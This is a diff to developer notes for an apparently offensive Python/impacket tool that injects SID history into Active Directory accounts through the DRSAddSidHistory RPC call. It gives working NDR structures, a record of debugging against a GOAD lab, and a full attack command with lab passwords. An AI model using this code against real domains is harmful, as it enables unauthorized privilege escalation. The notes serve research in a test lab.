@@ -193,31 +193,46 @@ The server behavior depends on the `Flags` field:
 
 ### Implementation in Python
 
+Getting the NDR structures right was the hardest part of this project. Here's what
+we learned the hard way, testing against a real GOAD lab.
+
 ```python
-# core/drsuapi.py - Key structures
+# core/drsuapi.py - The structures that actually work
+
+# Credential fields are [size_is(n)] WCHAR * — conformant arrays, NOT strings.
+class WCHAR_SIZED_ARRAY(NDRUniConformantArray):
+    item = '<H'  # unsigned short = WCHAR
+
+class PWCHAR_SIZED_ARRAY(NDRPOINTER):
+    referent = (('Data', WCHAR_SIZED_ARRAY),)
 
 class DRS_MSG_ADDSIDREQ_V1(NDRSTRUCT):
     structure = (
         ('Flags', DWORD),
-        ('SrcDomain', LPWSTR),        # Source domain FQDN
-        ('SrcPrincipal', LPWSTR),      # Source sAMAccountName or DN
-        ('SrcDomainController', LPWSTR), # Source PDC (optional)
+        ('SrcDomain', LPWSTR),              # [string] WCHAR * — LPWSTR is correct
+        ('SrcPrincipal', LPWSTR),            # [string] WCHAR *
+        ('SrcDomainController', LPWSTR),     # [string, ptr] WCHAR *
         ('SrcCredsUserLength', DWORD),
-        ('SrcCredsUser', LPWSTR),      # Auth for source domain
+        ('SrcCredsUser', PWCHAR_SIZED_ARRAY),     # [size_is()] WCHAR * — NOT LPWSTR!
         ('SrcCredsDomainLength', DWORD),
-        ('SrcCredsDomain', LPWSTR),
+        ('SrcCredsDomain', PWCHAR_SIZED_ARRAY),
         ('SrcCredsPasswordLength', DWORD),
-        ('SrcCredsPassword', LPWSTR),
-        ('DstDomain', LPWSTR),         # Destination domain FQDN
-        ('DstPrincipal', LPWSTR),      # Destination sAMAccountName or DN
+        ('SrcCredsPassword', PWCHAR_SIZED_ARRAY),
+        ('DstDomain', LPWSTR),              # [string] WCHAR *
+        ('DstPrincipal', LPWSTR),            # [string] WCHAR *
     )
 
+# The union wrapper — required by NDR encoding
+class DRS_MSG_ADDSIDREQ(NDRUNION):
+    commonHdr = (('tag', DWORD),)
+    union = { 1: ('V1', DRS_MSG_ADDSIDREQ_V1) }
+
 class DRSAddSidHistory(NDRCALL):
-    opnum = 20  # This is the key - tells impacket which RPC operation
+    opnum = 20
     structure = (
         ('hDrs', drsuapi.DRS_HANDLE),
-        ('dwInVersion', DWORD),        # Must be 1
-        ('pmsgIn', DRS_MSG_ADDSIDREQ_V1),
+        ('dwInVersion', DWORD),
+        ('pmsgIn', DRS_MSG_ADDSIDREQ),  # Union, not V1 directly
     )
 ```
 
@@ -241,44 +256,191 @@ implemented opnum 20. We define it ourselves.
 
 ---
 
-## NDR Structure Serialization
+## NDR Structure Serialization — A Debugging Story
 
-### The Challenge
+This section documents the real troubleshooting process of getting DRSAddSidHistory
+to work. Every bug here was discovered against a live GOAD lab and cost real debugging
+time. If you're implementing other DRSUAPI operations, these lessons will save you hours.
 
-The `DRS_MSG_ADDSIDREQ_V1` structure has **conformant arrays** for credentials:
+### Bug 1: `rpc_x_bad_stub_data` — The Missing Union
+
+**Symptom**: Every DRSAddSidHistory call returned `rpc_x_bad_stub_data`. The RPC
+connection worked (DRSBind succeeded), but the actual operation request was rejected
+before the server even looked at the data.
+
+**Root cause**: The `pmsgIn` field was defined as the V1 struct directly:
+
+```python
+# WRONG — causes rpc_x_bad_stub_data
+class DRSAddSidHistory(NDRCALL):
+    opnum = 20
+    structure = (
+        ('hDrs', drsuapi.DRS_HANDLE),
+        ('dwInVersion', DWORD),
+        ('pmsgIn', DRS_MSG_ADDSIDREQ_V1),  # <-- BUG: no union wrapper
+    )
+```
+
+In NDR encoding, `[switch_is(dwInVersion)] DRS_MSG_ADDSIDREQ *pmsgIn` is a
+**non-encapsulated union**. The discriminant tag IS serialized on the wire as part of
+the union data. Without the NDRUNION wrapper, the tag byte is missing and every
+subsequent field is offset by 4 bytes, making the entire request unreadable.
+
+**The fix**: Wrap in NDRUNION, exactly like impacket does for DRSGetNCChanges:
+
+```python
+class DRS_MSG_ADDSIDREQ(NDRUNION):
+    commonHdr = (('tag', DWORD),)
+    union = { 1: ('V1', DRS_MSG_ADDSIDREQ_V1) }
+
+class DRSAddSidHistory(NDRCALL):
+    opnum = 20
+    structure = (
+        ('hDrs', drsuapi.DRS_HANDLE),
+        ('dwInVersion', DWORD),
+        ('pmsgIn', DRS_MSG_ADDSIDREQ),  # Union, not V1
+    )
+```
+
+And when filling the request, set the tag explicitly:
+
+```python
+request['dwInVersion'] = 1
+request['pmsgIn']['tag'] = 1       # Select V1 arm
+v1 = request['pmsgIn']['V1']       # Access fields through the union
+v1['SrcDomain'] = src_domain + '\x00'
+```
+
+**How we found it**: Compared with impacket's `DRSCrackNames` which uses the exact
+same pattern (`dwInVersion` + NDRUNION). Every DRSUAPI call in impacket wraps its
+message struct in an NDRUNION — this is not optional.
+
+### Bug 2: `rpc_x_bad_stub_data` (again) — LPWSTR vs Conformant Array
+
+**Symptom**: After the union fix, calls with NULL credentials worked (we got real
+Win32 errors like 8536). But as soon as we passed actual source credentials
+(`--src-username`, `--src-password`), `rpc_x_bad_stub_data` returned.
+
+**Root cause**: The MS-DRSR IDL defines two different pointer types in the same struct:
 
 ```c
-[range(0,256)] DWORD SrcCredsUserLength;
-[size_is(SrcCredsUserLength)] WCHAR *SrcCredsUser;
+[string] WCHAR *SrcDomain;                          // null-terminated string
+[size_is(SrcCredsUserLength)] WCHAR *SrcCredsUser;   // sized array
 ```
 
-In NDR, `size_is(N)` means the array size is determined by another field.
-This creates a dependency between fields during serialization.
+These look similar but have **completely different NDR wire encodings**:
 
-### How impacket Handles It
+```
+LPWSTR ([string] WCHAR *):
+  [Referent ID: 4 bytes]
+  [MaximumCount: 4 bytes]
+  [Offset: 4 bytes]        ← present!
+  [ActualCount: 4 bytes]   ← present!
+  [Data + null terminator]
 
-impacket's NDR framework (`ndr.py`) uses Python class attributes to define structures.
-For simple cases, `LPWSTR` (pointer to wide string) handles null-terminated strings.
+Conformant array ([size_is(n)] WCHAR *):
+  [Referent ID: 4 bytes]
+  [MaximumCount: 4 bytes]
+  [Data, NO offset/actualcount/null]  ← 8 bytes shorter!
+```
 
-For the credential arrays, we set `SrcCredsUserLength = 0` and `SrcCredsUser = NULL`
-when no source credentials are provided (the DC uses the caller's credentials instead).
+When both are NULL pointers, they encode identically (just a zero referent ID).
+That's why the NULL case worked. But with actual data, LPWSTR adds 8 extra bytes
+(Offset + ActualCount) that the server doesn't expect for a sized array.
 
-When credentials ARE provided:
+**The fix**: Define a proper conformant WCHAR array type:
+
 ```python
-request['pmsgIn']['SrcCredsUserLength'] = len(username)  # Character count
-request['pmsgIn']['SrcCredsUser'] = username + '\x00'     # Null-terminated
+class WCHAR_SIZED_ARRAY(NDRUniConformantArray):
+    item = '<H'  # unsigned short = WCHAR (2 bytes LE)
+
+class PWCHAR_SIZED_ARRAY(NDRPOINTER):
+    referent = (('Data', WCHAR_SIZED_ARRAY),)
+
+class DRS_MSG_ADDSIDREQ_V1(NDRSTRUCT):
+    structure = (
+        ('SrcDomain', LPWSTR),                  # [string] — LPWSTR correct
+        ('SrcCredsUser', PWCHAR_SIZED_ARRAY),    # [size_is()] — NOT LPWSTR
+        ...
+    )
 ```
 
-The `LPWSTR` type in impacket handles the NDR encoding (conformant varying array
-with max count, offset, and actual count headers).
+And when setting credential values, pass a list of WCHAR ordinals:
 
-### Testing Without a DC
+```python
+v1['SrcCredsUser'] = [ord(c) for c in username]  # list of unsigned shorts
+```
 
-The hardest part: you can't easily unit-test NDR serialization without a real DC.
-The structures were validated by:
-1. Cross-referencing with DSInternals' `drsr.idl` (which has the full IDL)
-2. Comparing with impacket's existing `DRS_MSG_GETCHGREQ` union handling
-3. Verifying the opnum dispatch works (a wrong structure causes RPC_S_PROCNUM_OUT_OF_RANGE)
+### Bug 3: Error 8536 Misidentified as "SID Duplicated"
+
+**Symptom**: After fixing both NDR issues, we got Win32 error 8536. Our error table
+said "Target principal already has this SID" but LDAP queries showed the target had
+no sIDHistory at all. The SID was never injected.
+
+**Root cause**: Error 8536 is **not** `ERROR_DS_SID_DUPLICATED`. It's
+`ERROR_DS_DESTINATION_AUDITING_NOT_ENABLED`. The error code translation table
+was wrong.
+
+DRSAddSidHistory requires "Audit account management" (Success + Failure) to be
+enabled on BOTH the source and destination DCs. Without it, the operation is
+rejected before any SID manipulation happens.
+
+**The fix**: Correct the error table and add the related error:
+
+```python
+8521: "Source domain auditing not enabled (ERROR_DS_SOURCE_AUDITING_NOT_ENABLED)"
+8536: "Destination domain auditing not enabled (ERROR_DS_DESTINATION_AUDITING_NOT_ENABLED)"
+```
+
+On the DCs: `auditpol /set /category:"Account Management" /success:enable /failure:enable`
+
+### Bug 4: Error 8534 — Same Forest Rejection
+
+**Symptom**: Trying to inject `administrator@sevenkingdoms.local` into
+`jon.snow@north.sevenkingdoms.local` returned error 8534.
+
+**Root cause**: `sevenkingdoms.local` and `north.sevenkingdoms.local` are in the
+**same AD forest** (parent/child relationship). DRSAddSidHistory with `flags=0`
+(cross-forest variant) requires source and destination to be in **different forests**.
+
+In the GOAD lab:
+- `sevenkingdoms.local` ↔ `north.sevenkingdoms.local` = same forest (WITHIN_FOREST trust)
+- `essos.local` ↔ `sevenkingdoms.local` = different forests (FOREST_TRANSITIVE trust)
+
+### Bug 5: Error 5 — ACCESS_DENIED Without Source Credentials
+
+**Symptom**: Cross-forest call from `essos.local` to `north.sevenkingdoms.local`
+returned `ERROR_ACCESS_DENIED` (5), even though the caller (`eddard.stark`) was
+Domain Admin in the destination domain.
+
+**Root cause**: DRSAddSidHistory cross-forest makes the **destination DC contact
+the source DC** to verify the source principal. When `SrcCredsUser/Domain/Password`
+are NULL, the DC uses the caller's credentials. But `eddard.stark` has no account
+in `essos.local`, so the source DC rejects the authentication.
+
+**The fix**: Add `--src-username`, `--src-password`, `--src-domain` CLI options to
+pass credentials for the source domain. The destination DC uses these credentials
+when contacting the source DC:
+
+```bash
+python3 sidhistory.py -d north.sevenkingdoms.local \
+    -u eddard.stark -p 'FightP3aceAndHonor!' -dc 10.3.10.11 \
+    --target jon.snow \
+    --source-user daenerys.targaryen --source-domain essos.local \
+    --method drsuapi \
+    --src-username daenerys.targaryen --src-password 'BurnThemAll!' --src-domain essos.local
+```
+
+### Lesson Learned
+
+You **cannot** unit-test NDR serialization without a real DC. The structures were
+validated iteratively against a live GOAD lab:
+
+1. `rpc_x_bad_stub_data` = your NDR encoding is wrong (union missing, wrong types)
+2. Real Win32 errors (5, 8521, 8534, 8536, 8547, 8548) = encoding is correct,
+   the DC is actually processing your request and rejecting it for business logic reasons
+3. The transition from stub errors to application errors is how you know your
+   serialization is finally right
 
 ---
 
